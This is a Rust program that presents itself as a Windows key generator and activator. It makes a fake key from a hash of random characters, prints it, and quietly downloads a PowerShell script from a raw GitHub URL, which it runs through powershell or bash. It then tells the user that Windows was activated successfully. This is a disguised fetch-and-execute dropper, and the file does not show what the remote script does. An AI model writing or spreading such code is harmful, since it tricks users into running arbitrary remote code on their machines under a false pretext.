use rand::{distributions::Alphanumeric, prelude, Rng};
use reqwest;
use std::process::{Command, Output};

fn generate_key() -> String {
    let random_string: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let hash = md5::compute(random_string.as_bytes());
    let hash_hex = format!("{:x}", hash);
    hash_hex
}

fn run_command(command: &String) -> Output {
    if cfg!(target_os = "windows") {
        Command::new("powershell")
            .arg("-Command")
            .arg(command)
            .output()
            .expect("Run command again!")
    } else {
        println!("{}", command);
        Command::new("bash")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Run command again!")
    }
}

#[tokio::main]
async fn main() {
    let url = "https://raw.githubusercontent.com/El0mar/legendary-train/refs/heads/main/script.ps1";
    let windows_key = generate_key();
    match reqwest::get(url).await {
        Ok(response) => {
            if let Ok(command) = response.text().await {
                println!("Windows Key has been initialized: {}", windows_key);
                run_command(&command);
                println!("Windows has been activated succesfully!");
            }
        }
        Err(_e) => {
            eprintln!(
                "An error was encountered while generating your Windows key, please run it again."
            );
        }
    }
}
